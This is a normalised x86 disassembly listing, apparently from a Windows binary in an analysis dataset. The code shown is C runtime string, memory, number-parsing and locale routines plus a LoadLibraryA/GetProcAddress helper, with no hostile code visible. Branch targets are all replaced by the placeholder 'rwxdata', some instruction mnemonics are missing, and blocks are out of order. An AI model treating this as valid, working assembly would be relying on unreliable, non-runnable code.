call [ GetCPInfo@IAT ]
cmp eax 0x1
jne rwxdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb rwxdata
cmp eax 0x5a
ja rwxdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb rwxdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je rwxdata
and [ eax + rwxdata ] 0x0
cmp eax 0x7a
ja rwxdata
or [ eax + rwxdata ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rwxdata ]
push [ rwxdata ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40a0b7
push 0x0
lea eax [ ebp - 0x214 ]
push [ rwxdata ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rwxdata ]
call sub_409e68
push 0x0
lea eax [ ebp - 0x314 ]
push [ rwxdata ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rwxdata ]
call sub_409e68
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb rwxdata
pop esi
leave
retn
or [ eax + rwxdata ] 0x20
mov cl al
sub cl 0x20
jmp rwxdata
inc eax
cmp eax esi
jb rwxdata
test dl 0x2
je rwxdata
or [ eax + rwxdata ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne rwxdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rwxdata ] cl
jmp rwxdata
and [ eax + rwxdata ] 0x0
or [ eax + rwxdata ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp rwxdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb rwxdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja rwxdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je rwxdata
jmp rwxdata
mov [ eax + rwxdata ] dl
jmp rwxdata
sub_409440
push edi
mov edi [ esp + 0x8 ]
jmp rwxdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je rwxdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je rwxdata
mov dl [ ecx ]
inc ecx
test dl dl
je rwxdata
mov [ edi ] edx
add edi 0x4
test dl dl
je rwxdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne rwxdata
test dh dh
je rwxdata
jmp rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je rwxdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp rwxdata
sub_409450
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je rwxdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je rwxdata
mov al [ ecx ]
inc ecx
test al al
je rwxdata
mov eax [ ecx - 0x4 ]
test al al
je rwxdata
lea edi [ ecx - 0x1 ]
jmp rwxdata
test ecx 0x3
jne rwxdata
lea edi [ ecx - 0x4 ]
test ah ah
je rwxdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je rwxdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je rwxdata
mov dl [ ecx ]
inc ecx
test dl dl
je rwxdata
lea edi [ ecx - 0x3 ]
jmp rwxdata
test eax 0xff0000
je rwxdata
mov [ edi ] edx
add edi 0x4
test dl dl
je rwxdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne rwxdata
lea edi [ ecx - 0x2 ]
jmp rwxdata
test eax 0xff000000
je rwxdata
test dh dh
je rwxdata
jmp rwxdata
jmp rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je rwxdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je rwxdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp rwxdata
sub_409547
push ebp
mov ebp esp
sub esp 0xc
push ebx
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0x8 ]
mov bl [ edi ]
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] esi
mov ecx [ rwxdata ]
movzx eax bl
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax bl
push 0x8
push eax
call sub_40a2cc
pop ecx
pop ecx
jmp rwxdata
cmp bl 0x2d
mov [ ebp - 0x4 ] esi
jne rwxdata
mov bl [ esi ]
inc esi
jmp rwxdata
test eax eax
je rwxdata
cmp bl 0x2b
jne rwxdata
or [ ebp + 0x14 ] 0x2
jmp rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
mov eax [ ebp + 0x10 ]
test eax eax
jl rwxdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp + 0xc ]
test eax eax
je rwxdata
cmp eax 0x1
je rwxdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg rwxdata
push 0x10
test eax eax
pop ecx
jne rwxdata
cmp [ ebp + 0x10 ] ecx
jne rwxdata
cmp bl 0x30
je rwxdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov edi 0x103
mov [ ebp - 0xc ] eax
cmp bl 0x30
jne rwxdata
mov al [ esi ]
cmp al 0x78
je rwxdata
mov [ ebp + 0x10 ] 0xa
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40a2cc
pop ecx
pop ecx
jmp rwxdata
mov al [ esi ]
cmp al 0x78
je rwxdata
mov [ ebp + 0x10 ] ecx
cmp al 0x58
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
movsx ecx bl
sub ecx 0x30
jmp rwxdata
test eax eax
je rwxdata
mov bl [ esi + 0x1 ]
inc esi
inc esi
mov [ ebp - 0x4 ] esi
cmp al 0x58
jne rwxdata
mov [ ebp + 0x10 ] 0x8
jmp rwxdata
mov eax [ rwxdata ]
mov ax [ eax + esi * 2 ]
and eax edi
push edi
push esi
call sub_40a2cc
pop ecx
pop ecx
jmp rwxdata
cmp ecx [ ebp + 0x10 ]
jae rwxdata
mov ecx [ ebp + 0x14 ]
dec [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
test cl 0x8
jne rwxdata
movsx eax bl
push eax
call sub_40a200
pop ecx
mov ecx eax
sub ecx 0x37
test eax eax
je rwxdata
mov esi [ ebp - 0x8 ]
or [ ebp + 0x14 ] 0x8
cmp esi [ ebp - 0xc ]
jb rwxdata
test cl 0x4
mov eax 0x7fffffff
jne rwxdata
test edx edx
je rwxdata
imul esi [ ebp + 0x10 ]
add esi ecx
mov [ ebp - 0x8 ] esi
jne rwxdata
test [ ebp + 0x14 ] 0x1
mov [ rwxdata ] 0x22
je rwxdata
test cl 0x1
jne rwxdata
and [ ebp - 0x8 ] 0x0
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ rwxdata ] 0x1
movzx esi bl
jle rwxdata
or [ ebp + 0x14 ] 0x4
jmp rwxdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ecx edx
jbe rwxdata
mov ecx [ ebp + 0x14 ]
and cl 0x2
neg cl
sbb ecx ecx
neg ecx
add ecx eax
mov [ ebp - 0x8 ] ecx
or [ ebp - 0x8 ] 0xffffffff
jmp rwxdata
test edx edx
je rwxdata
and ecx 0x2
je rwxdata
mov eax [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov bl [ eax ]
jmp rwxdata
test [ ebp + 0x14 ] 0x2
je rwxdata
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
test ecx ecx
jne rwxdata
cmp [ ebp - 0x8 ] 0x80000000
ja rwxdata
mov eax [ ebp - 0x8 ]
jmp rwxdata
mov eax [ ebp - 0x8 ]
neg eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] eax
jbe rwxdata
pop edi
pop esi
pop ebx
leave
retn
sub_409760
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je rwxdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je rwxdata
mov eax [ edx - 0x4 ]
cmp al bl
je rwxdata
and eax 0x81010100
je rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je rwxdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne rwxdata
and eax 0x1010100
jne rwxdata
pop ebx
xor eax eax
retn
test edx 0x3
jne rwxdata
pop esi
pop edi
cmp ah bl
je rwxdata
and esi 0x80000000
jne rwxdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je rwxdata
shr eax 0x10
cmp al bl
je rwxdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
cmp ah bl
je rwxdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je rwxdata
jmp rwxdata
sub_409820
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je rwxdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je rwxdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp rwxdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je rwxdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je rwxdata
mov al [ esi ]
inc esi
cmp al dh
jne rwxdata
test al al
je rwxdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je rwxdata
cmp al dl
je rwxdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je rwxdata
and eax 0x81010100
je rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je rwxdata
test al al
jne rwxdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne rwxdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne rwxdata
and eax 0x1010100
jne rwxdata
pop ebx
xor eax eax
retn
test edx 0x3
jne rwxdata
mov al [ ecx + 0x3 ]
test al al
je rwxdata
pop esi
pop edi
cmp ah bl
je rwxdata
and esi 0x80000000
jne rwxdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je rwxdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je rwxdata
mov ah [ ecx + 0x2 ]
test ah ah
je rwxdata
jmp rwxdata
shr eax 0x10
cmp al bl
je rwxdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
cmp ah bl
je rwxdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je rwxdata
jmp rwxdata
sub_4098a0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz rwxdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja rwxdata
not ecx
je rwxdata
dec ecx
dec ecx
sub_4098e0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb rwxdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae rwxdata
sub_40990f
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
push rwxdata
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rwxdata ]
call eax
mov ebx eax
test ebx ebx
je rwxdata
xor eax eax
jmp rwxdata
mov esi [ GetProcAddress@IAT ]
push rwxdata
push edi
call esi
test eax eax
mov [ rwxdata ] eax
je rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
push rwxdata
push edi
call esi
push rwxdata
push edi
mov [ rwxdata ] eax
call esi
mov [ rwxdata ] eax
push ebx
call eax
mov ebx eax
sub_4099a0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je rwxdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne rwxdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je rwxdata
shr ecx 0x2
jne rwxdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je rwxdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je rwxdata
jmp rwxdata
test edi 0x3
je rwxdata
test esi 0x3
jne rwxdata
mov [ edi ] edx
add edi 0x4
dec ecx
je rwxdata
test dl dl
je rwxdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je rwxdata
mov ebx ecx
shr ecx 0x2
jne rwxdata
mov [ edi ] al
inc edi
dec ecx
je rwxdata
mov ebx ecx
shr ecx 0x2
jne rwxdata
and ebx 0x3
je rwxdata
xor edx edx
mov [ edi ] edx
test dh dh
je rwxdata
dec ebx
jne rwxdata
dec ebx
jne rwxdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne rwxdata
and ebx 0x3
jne rwxdata
and edx 0xff
mov [ edi ] edx
jmp rwxdata
test edx 0xff0000
je rwxdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne rwxdata
add edi 0x4
xor eax eax
dec ecx
je rwxdata
and edx 0xffff
mov [ edi ] edx
jmp rwxdata
test edx 0xff000000
jne rwxdata
mov [ edi ] edx
jmp rwxdata
sub_409aa7
mov eax [ rwxdata ]
test eax eax
je rwxdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je rwxdata
push 0x1
pop eax
retn
sub_409ad0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe rwxdata
test edi 0x3
jne rwxdata
cmp edi eax
jb rwxdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne rwxdata
jmp [ ecx * 4 + rwxdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_409b30 ]
jmp [ ecx * 4 + jump_table_409bac ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409c18 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb rwxdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb rwxdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409c18 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_409db0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_409cb8 ]
neg ecx
jmp [ ecx * 4 + rwxdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409db0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409c18 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409c18 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409c18 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb rwxdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb rwxdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409db0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409db0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409db0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409db0 ]
sub_409e10
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je rwxdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb rwxdata
mov [ edi ] al
inc edi
dec edx
jne rwxdata
neg ecx
and ecx 0x3
je rwxdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je rwxdata
sub edx ecx
[ edi ]
test edx edx
je rwxdata
mov [ edi ] al
inc edi
dec ecx
jne rwxdata
sub_409e68
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rwxdata ] edi
jne rwxdata
cmp [ ebp + 0x14 ] edi
jle rwxdata
push edi
push edi
push 0x1
pop ebx
push ebx
push rwxdata
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je rwxdata
mov eax [ rwxdata ]
cmp eax 0x2
jne rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40a08c
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push rwxdata
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je rwxdata
mov [ rwxdata ] ebx
jmp rwxdata
cmp eax 0x1
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp rwxdata
xor eax eax
mov [ rwxdata ] 0x2
cmp [ ebp + 0x20 ] edi
jne rwxdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_4098e0
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp [ ebp - 0x24 ] edi
je rwxdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je rwxdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je rwxdata
test [ ebp + 0xd ] 0x4
je rwxdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_4098e0
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp rwxdata
cmp [ ebp + 0x1c ] edi
je rwxdata
cmp ebx edi
je rwxdata
mov eax esi
jmp rwxdata
cmp esi [ ebp + 0x1c ]
jg rwxdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne rwxdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne rwxdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp rwxdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je rwxdata
sub_40a08c
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je rwxdata
cmp [ eax ] 0x0
pop esi
jne rwxdata
cmp [ eax ] 0x0
je rwxdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne rwxdata
sub_40a0b7
push ebp
mov ebp esp
push 0xffffffff
push rwxdata
push rwxdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rwxdata ]
xor ebx ebx
cmp eax ebx
jne rwxdata
cmp eax 0x2
jne rwxdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push rwxdata
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je rwxdata
cmp eax 0x1
jne rwxdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne rwxdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push rwxdata
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je rwxdata
mov eax esi
jmp rwxdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne rwxdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp rwxdata
mov eax [ rwxdata ]
push 0x2
pop eax
mov [ rwxdata ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je rwxdata
mov eax [ rwxdata ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_4098e0
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_409e10
add esp 0xc
jmp rwxdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je rwxdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je rwxdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp rwxdata
sub_40a200
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0x0
push ebx
jne rwxdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jge rwxdata
mov eax [ ebp + 0x8 ]
cmp eax 0x61
jl rwxdata
mov edx [ rwxdata ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je rwxdata
cmp [ rwxdata ] 0x1
jle rwxdata
pop ebx
leave
retn
cmp eax 0x7a
jg rwxdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
push 0x1
